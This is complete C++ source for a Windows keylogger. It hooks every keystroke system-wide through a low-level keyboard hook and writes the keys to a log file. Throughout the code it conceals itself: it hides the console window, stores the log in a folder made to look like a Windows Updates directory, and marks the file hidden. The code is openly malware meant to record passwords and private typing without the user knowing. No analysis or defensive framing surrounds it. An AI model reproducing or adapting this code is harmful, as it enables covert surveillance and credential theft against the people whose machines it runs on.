#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup") // must be here to avoid the console window, otherwise the program will run with a console window which is not desired for a keylogger

#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <shlobj.h> 

std::wstring GetLogPath() {
    wchar_t path[MAX_PATH];
    // This finds the "C:\Users\<User>\AppData\Local" folder
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
        std::wstring logDir = std::wstring(path) + L"\\Microsoft\\Windows\\Updates";

        CreateDirectoryW(logDir.c_str(), NULL); //create if doesnt exist

        return logDir + L"\\data_log.txt";
    }
    return L"keylog.txt"; 
}

void WriteToLog(std::wstring text) {
    static std::wstring finalPath = GetLogPath();

    std::wofstream logFile(finalPath, std::ios::app);
    if (logFile.is_open()) {
        logFile << text;
        logFile.close();

        // if not hidden hide
        DWORD attributes = GetFileAttributesW(finalPath.c_str());
        if (!(attributes & FILE_ATTRIBUTE_HIDDEN)) {
            SetFileAttributesW(finalPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
        }
    }
}

void SyncKeyboardState(BYTE* state) {
    for (int i = 0; i < 256; i++) {
        state[i] = GetKeyState(i);
    }
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vk = pKeyBoard->vkCode;

        //Handle "Command" Keys
        if (vk == VK_RETURN) { WriteToLog(L"[ENTER]\n"); return CallNextHookEx(NULL, nCode, wParam, lParam); }
        if (vk == VK_BACK) { WriteToLog(L"[BACKSPACE]"); return CallNextHookEx(NULL, nCode, wParam, lParam); }
        if (vk == VK_TAB) { WriteToLog(L"[TAB]"); return CallNextHookEx(NULL, nCode, wParam, lParam); }
        if (vk == VK_ESCAPE) { WriteToLog(L"[ESC]"); return CallNextHookEx(NULL, nCode, wParam, lParam); }
        if (vk == VK_CONTROL || vk == VK_LCONTROL || vk == VK_RCONTROL) { WriteToLog(L"[CTRL]"); return CallNextHookEx(NULL, nCode, wParam, lParam); }
        if (vk == VK_MENU || vk == VK_LMENU || vk == VK_RMENU) { WriteToLog(L"[ALT]"); return CallNextHookEx(NULL, nCode, wParam, lParam); }
        if (vk == VK_LWIN || vk == VK_RWIN) { WriteToLog(L"[WIN]"); return CallNextHookEx(NULL, nCode, wParam, lParam); }

        // Sync Keyboard for Symbols
        BYTE keyboardState[256];
        SyncKeyboardState(keyboardState);

        wchar_t buffer[5];
        int result = ToUnicode(vk, pKeyBoard->scanCode, keyboardState, buffer, 4, 0);

        if (result > 0) {
            buffer[result] = L'\0';
            WriteToLog(buffer);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0); //create the hook to take from windows

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
	} //keep the program running to listen for key events

    UnhookWindowsHookEx(hhkLowLevelKybd);
    return 0;
}